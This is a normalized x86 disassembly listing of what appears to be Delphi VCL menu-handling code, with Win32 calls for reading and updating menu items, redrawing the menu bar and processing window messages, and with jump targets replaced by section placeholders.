je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e754
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_421a7c
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_462798
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_461b08
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_40331c
mov eax [ esi + 0x44 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_461b7c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_461b7c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45e2c0
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_460c04
mov eax ebx
pop esi
pop ebx
retn
sub_461bbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_460800
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_460810
call sub_461bbc
pop ecx
test al al
je r-xdata
sub_461c54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_461bbc
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45e2c0
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_461c84
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_461c54
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_462fa8
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_461cf4
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_461c54
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_461d10
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_461c54
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_4613c0
mov ebx eax
xor edx edx
mov eax edi
call sub_4618bc
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_460d28
mov eax [ esi + 0x34 ]
call sub_460d28
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_45ec64
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4550b4
push eax
call DrawMenuBar
sub_461dfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_461dfc
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_461f21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_461c54
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_460d28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_461dec
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_461f50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42a6bc
xor eax eax
push ebp
push sub_46204e
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42a6bc
xor eax eax
push ebp
push sub_462023
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_461dfc
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42a6b4
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462055
mov eax [ rw-data ]
call sub_42a6b4
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_461c54
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_462074
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_4623f8
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_4623f8
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_462130
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4626cc
mov eax ebx
call sub_408bbc
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_4621d0
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_462130
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404388
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4045d8
lea edx [ ebp - 0x200 ]
call sub_408c80
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_462264
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_4622d4
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_462774
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_462774
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_462774
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_4622e0
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_4621d0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_462264
mov eax ebx
call sub_462798
jmp r-xdata
sub_462348
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_462390
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_45c5c0
mov eax ebx
call sub_461ba4
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_45c604
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_421b4c
sub_4623cc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421d98
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_462390
sub_462410
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_461c54
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_461c54
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_465758
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_46246c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_462541
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_461c54
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_461c54
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_460800
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_460810
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404300
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404300
mov eax [ ebp - 0xc ]
pop edx
call sub_408210
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_4632b8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462548
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40413c
retn
sub_462554
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_462410
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_46246c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_4626cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_461dd8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_461c54
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_461c54
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408c60
mov eax [ ebp + 0x10 ]
call sub_408ba4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_462798
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_44b794
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_462774
mov [ ebx + 0x41 ] 0x1
sub_4627c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_462774
mov [ ebx + 0x41 ] 0x1
sub_46284c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_462348
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_4621d0
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_4628dc
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_462918
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_462942
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462964
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_462e97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462e9e
lea eax [ ebp - 0x30 ]
call sub_404118
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov edx [ esi + 0x4 ]
call sub_461d10
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46ed68
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov dx [ esi + 0x4 ]
call sub_461cf4
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_462cca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_462cad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_425b4c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4259ec
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_46313c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462cb4
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_425b4c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_462554
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_461c54
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_461c54
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_462e0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_462de8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_462dcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_425b4c
mov eax [ rw-data ]
